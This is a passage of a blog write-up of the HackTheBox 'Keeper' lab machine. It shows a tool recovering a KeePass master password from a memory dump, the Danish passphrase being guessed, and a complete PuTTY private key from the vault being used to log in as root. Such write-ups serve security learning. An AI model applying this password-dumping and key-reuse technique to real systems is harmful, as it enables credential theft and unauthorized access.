<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Keeper/keepass-password-dumper]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ cat keepass_password_dumper.csproj 
</span></span><span class="line"><span class="cl">&lt;Project Sdk=&#34;Microsoft.NET.Sdk&#34;&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  &lt;PropertyGroup&gt;
</span></span><span class="line"><span class="cl">    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
</span></span><span class="line"><span class="cl">    &lt;TargetFramework&gt;net6.0&lt;/TargetFramework&gt;
</span></span><span class="line"><span class="cl">    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
</span></span><span class="line"><span class="cl">    &lt;Nullable&gt;enable&lt;/Nullable&gt;
</span></span><span class="line"><span class="cl">  &lt;/PropertyGroup&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&lt;/Project&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>This might not always work, but here it is good enough.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">‚îå‚îÄ‚îÄ(kali„âøkali)-[~/Documents/Keeper/keepass-password-dumper]
</span></span><span class="line"><span class="cl">‚îî‚îÄ$ dotnet run ../KeePassDumpFull.dmp 
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óèd
</span></span><span class="line"><span class="cl">Found: ‚óè‚óè‚óèg
</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
</span></span><span class="line"><span class="cl">Password candidates (character positions):
</span></span><span class="line"><span class="cl">Unknown characters are displayed as &#34;‚óè&#34;
</span></span><span class="line"><span class="cl">1.:     ‚óè
</span></span><span class="line"><span class="cl">2.:     ,, l, `, -, &#39;, ], A, I, :, =, _, c, M, 
</span></span><span class="line"><span class="cl">3.:     d, 
</span></span><span class="line"><span class="cl">4.:     g, 
</span></span><span class="line"><span class="cl">5.:     r, 
</span></span><span class="line"><span class="cl">6.:     ‚óè
</span></span><span class="line"><span class="cl">7.:     d, 
</span></span><span class="line"><span class="cl">8.:      , 
</span></span><span class="line"><span class="cl">9.:     m, 
</span></span><span class="line"><span class="cl">10.:    e, 
</span></span><span class="line"><span class="cl">11.:    d, 
</span></span><span class="line"><span class="cl">12.:     , 
</span></span><span class="line"><span class="cl">13.:    f, 
</span></span><span class="line"><span class="cl">14.:    l, 
</span></span><span class="line"><span class="cl">15.:    ‚óè
</span></span><span class="line"><span class="cl">16.:    d, 
</span></span><span class="line"><span class="cl">17.:    e, 
</span></span><span class="line"><span class="cl">Combined: ‚óè{,, l, `, -, &#39;, ], A, I, :, =, _, c, M}dgr‚óèd med fl‚óède
</span></span></code></pre></td></tr></table>
</div>
</div><p>The password is looking a little odd to say the least. After reviewing their example, it looks like the program often cannot distinguish the first few characters. We know lnogaard is Danish based on her ticket profile, so it is possible that these words not English. Searching on google for <code>**dgr*d med fl*de</code> eventually leads to something that might be a popular phrase: R√∏dgr√∏d Med Fl√∏de. Firstly starting with no caps, we get a hit.
<code>r√∏dgr√∏d med fl√∏de</code></p>
<h3 id="root-access-via-putty-key">Root access via PuTTY Key
</h3><p><img src="/p/hackthebox-keeper/Images/vault1.png"
	width="965"
	height="406"
	srcset="/p/hackthebox-keeper/Images/vault1_hu9658442772167483771.png 480w, /p/hackthebox-keeper/Images/vault1_hu11083062852261709616.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="237"
		data-flex-basis="570px"
	
></p>
<p>We see a couple passwords entered, but the first thing to catch my eye is in the Notes, a PuTTY-User-Key-File.</p>
<p><img src="/p/hackthebox-keeper/Images/vault2.png"
	width="643"
	height="550"
	srcset="/p/hackthebox-keeper/Images/vault2_hu972757140726052444.png 480w, /p/hackthebox-keeper/Images/vault2_hu4784006855765255731.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="116"
		data-flex-basis="280px"
	
></p>
<p>When going to the edit page, we can see the supplied password and what looks to be an RSA key:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PuTTY-User-Key-File-3: ssh-rsa
</span></span><span class="line"><span class="cl">Encryption: none
</span></span><span class="line"><span class="cl">Comment: rsa-key-20230519
</span></span><span class="line"><span class="cl">Public-Lines: 6
</span></span><span class="line"><span class="cl">AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
</span></span><span class="line"><span class="cl">8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
</span></span><span class="line"><span class="cl">EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
</span></span><span class="line"><span class="cl">Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
</span></span><span class="line"><span class="cl">FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
</span></span><span class="line"><span class="cl">LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
</span></span><span class="line"><span class="cl">Private-Lines: 14
</span></span><span class="line"><span class="cl">AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
</span></span><span class="line"><span class="cl">oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
</span></span><span class="line"><span class="cl">kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
</span></span><span class="line"><span class="cl">f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
</span></span><span class="line"><span class="cl">VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
</span></span><span class="line"><span class="cl">UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
</span></span><span class="line"><span class="cl">OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
</span></span><span class="line"><span class="cl">in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
</span></span><span class="line"><span class="cl">SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
</span></span><span class="line"><span class="cl">09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
</span></span><span class="line"><span class="cl">xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
</span></span><span class="line"><span class="cl">AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
</span></span><span class="line"><span class="cl">AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
</span></span><span class="line"><span class="cl">NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
</span></span><span class="line"><span class="cl">Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
</span></span></code></pre></td></tr></table>
</div>
</div><p>To use this putty key, we can begin by installing putty:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="err">‚îå‚îÄ‚îÄ</span><span class="p">(</span><span class="nx">kali</span><span class="err">„âø</span><span class="nx">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[~</span><span class="o">/</span><span class="nx">Documents</span><span class="o">/</span><span class="nx">Keeper</span><span class="o">/</span><span class="nx">keepass</span><span class="o">-</span><span class="nx">password</span><span class="o">-</span><span class="nx">dumper</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">‚îî‚îÄ$</span> <span class="nx">sudo</span> <span class="nx">apt</span> <span class="nx">install</span> <span class="nx">putty</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">sudo</span><span class="p">]</span> <span class="nx">password</span> <span class="k">for</span> <span class="nx">kali</span><span class="p">:</span> 
</span></span><span class="line"><span class="cl"><span class="nx">Reading</span> <span class="kn">package</span> <span class="nx">lists</span><span class="o">...</span> <span class="nx">Done</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="o">...</span><span class="nx">SNIP</span><span class="o">...</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This putty will launch a GUI:
<img src="/p/hackthebox-keeper/Images/putty1.png"
	width="644"
	height="616"
	srcset="/p/hackthebox-keeper/Images/putty1_hu2051637233010673934.png 480w, /p/hackthebox-keeper/Images/putty1_hu14431915319961417969.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="104"
		data-flex-basis="250px"
	
></p>
<p>Under SSH &gt; Auth &gt; Credentials, we can supply a private key file. Here, I supply a file with the previous rsa key contents pasted:</p>
<p><img src="/p/hackthebox-keeper/Images/putty2.png"
	width="657"
	height="630"
	srcset="/p/hackthebox-keeper/Images/putty2_hu11691494846399040932.png 480w, /p/hackthebox-keeper/Images/putty2_hu7146212028387881672.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="104"
		data-flex-basis="250px"
	
></p>
<p>Now we can specify the host name in Session, and open.</p>
<p><img src="/p/hackthebox-keeper/Images/putty3.png"
	width="639"
	height="624"
	srcset="/p/hackthebox-keeper/Images/putty3_hu4118433769461858058.png 480w, /p/hackthebox-keeper/Images/putty3_hu344581190828456088.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="102"
		data-flex-basis="245px"
	
></p>
<p>We have to specify logging in as root, but once we do, we are in without supplying the password!</p>
<p><img src="/p/hackthebox-keeper/Images/PuttyRoot.png"
	width="496"
	height="266"
	srcset="/p/hackthebox-keeper/Images/PuttyRoot_hu550469918219517095.png 480w, /p/hackthebox-keeper/Images/PuttyRoot_hu4702447967777450180.png 1024w"
	loading="lazy"
	
		alt="Loggin in as root"
	
	
		class="gallery-image" 
		data-flex-grow="186"
		data-flex-basis="447px"
	
></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/keepass/">Keepass</a>
        
            <a href="/tags/bestpractical/">BestPractical</a>
        
            <a href="/tags/putty/">Putty</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/hackthebox-devvortex/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-devvortex/Devvortex.61ba3466bff8da52f89d2bb6417fb83a_hu4257021157125360887.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Devvortex"
                        
                        data-hash="md5-Ybo0Zr/42lL4nSu2QX&#43;4Og==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Devvortex</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-surveillance/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-surveillance/Surveillance.8b9fd8fd814572f9ed8f343a005ca93c_hu1936471103572467903.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Surveillance"
                        
                        data-hash="md5-i5/Y/YFFcvntjzQ6AFypPA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Surveillance</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-hospital/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-hospital/Hospital.dd28dc96da49df800b952a77639d4857_hu7748615803054416032.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Hospital"
                        
                        data-hash="md5-3SjcltpJ34ALlSp3Y51IVw==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Hospital</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-codify/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-codify/Codify.d19bf609d86d6ee490cdde52cb652366_hu5530218627868483871.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Codify"
                        
                        data-hash="md5-0Zv2CdhtbuSQzd5Sy2UjZg==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Codify</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/hackthebox-analytics/">
        
        
            <div class="article-image">
                <img src="/p/hackthebox-analytics/Analytics.b761a640e4211a48e503c55ca0e36d11_hu18004703824071439858.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post HackTheBox - Analytics"
                        
                        data-hash="md5-t2GmQOQhGkjlA8VcoONtEQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">HackTheBox - Analytics</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script>
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (typeof DISQUS == 'object') {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 Spencer&#39;s Blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.799eb5847effe83ae252baf7b2236f0c3752b0188dd0985faa7efc75ea805b29.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
